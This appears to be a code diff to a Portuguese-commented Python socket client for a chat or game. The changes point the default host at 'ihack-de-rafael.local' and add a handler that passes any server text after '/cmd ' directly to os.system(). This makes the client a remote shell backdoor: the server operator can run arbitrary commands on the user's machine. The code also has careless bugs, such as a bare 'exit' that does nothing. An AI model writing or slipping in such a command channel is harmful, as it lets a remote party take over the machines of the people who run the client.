@@ -2,50 +2,89 @@ import time
 import os
 import socket
 
+podeConectar = False
+
 HOST = input("Digite o nome do host: ") #'127.0.0.1'
 if HOST == "" :
-    HOST = "localhost"
-    print("\nUsando localhost!\n")
+    HOST = "ihack-de-rafael.local"
+    print("\nUsando " + HOST + "!\n")
 
 PORT = 50790  # ADV0 em T9
 
 tcp = socket.socket( socket.AF_INET , socket.SOCK_STREAM )
 dest = (HOST, PORT)
 print("HOST: " + HOST + ", PORT: " + str(PORT))
-tcp.connect(dest)
-print("Para sair use CTRL+X\n")
-
-msg = "Olá!"
-print("Você disse '" + msg + "' para o servidor...")
-
+try:
+    tcp.connect(dest)
+    podeConectar = True
+    pass
+    
+except ConnectionRefusedError:
+    print("\nConexão recusada! O servidor está online?\n\n")
+    exit
 
 def capturarEntrada() :
     global msg
-    msg = input(">> ")
+    
+    while True:
+        msg = input(">> ")
 
 
 def interagirSocket():
     global msg
     global tcp
 
-    while True: #(msg != '\x18') or (msg != "/kick " + nomeJogador) :            # respeitar ordem correta de operações para não dar merda
+    print("Para sair use CTRL+X\n")
 
+    msg_inicial = "Olá!"
+    msg = msg_inicial
+
+    print("Você disse '" + msg + "' para o servidor...")
+
+    while True: #(msg != '\x18') or (msg != "/kick " + nomeJogador) :            # respeitar ordem correta de operações para não dar merda
+        time.sleep(0.5) # escrever linhas de forma organizada e sem cagar tudo
         # envia qualquer coisa
-        if len(msg) > 0 :
-            tcp.sendall(msg.encode())
-            msg = ""    # limpar msg
+        #if len(msg) > 0 : #and msg != msg_inicial :
+        #if len(msg) == 1 and int(msg) in [0,1,2,3,4,5,6,7,8,9] :
+        try:
+            tcp.send(msg.encode())      # send() ou sendall()
+            pass
+
+        except BrokenPipeError:
+            print("Conexão quebrada! Reinicie o cliente!")
+            exit
+    
+        msg = "invalido"
+        #msg = "limpo"    # limpar msg , None, "" ou "10"
+
 
         data_received = tcp.recv(1024)
-        texto = data_received.decode()
-        if len(texto) > 0:
-            print(texto)
+        recv = data_received.decode()
+        if len(recv) > 0:
+            print(recv)
 
         #tcp.send (msg.encode())
         #msg = input(">> ")
 
-        if texto == "/quit 0" :
-            print("AVISO: O servidor fechou o jogo!")
-            tcp.close()
+        if "/cmd " in recv :
+            verb = recv.split("/cmd ")[1]
+            
+            try:
+                os.system(verb)
+
+            except OSError as e:
+                print("Comando não encontrado!")
+                print(e)
+
+
+            if verb == "quit" :
+                tcp.close()
+                exit
+
+        #limpar coisas
+        #msg = ""
+        #recv = ""
+            
     
 import threading
 thread_list = {}
@@ -58,10 +97,15 @@ if __name__ == '__main__':
     thread_list["interagirSocket"]            = threading.Thread(target=interagirSocket , name="interagirSocket", args=() )
 
     # iniciar threads
-    thread_list["capturarEntrada"].start()
-    thread_list["interagirSocket"].start()
+    if podeConectar == True :
+        thread_list["capturarEntrada"].start()
+        thread_list["interagirSocket"].start()
+
+        #while True:
+        #    thread_list["capturarEntrada"].join(timeout=3)
 
 
+    # fim da condicional de conexao valida com servidor!
 
     #tcp.close()
     quit
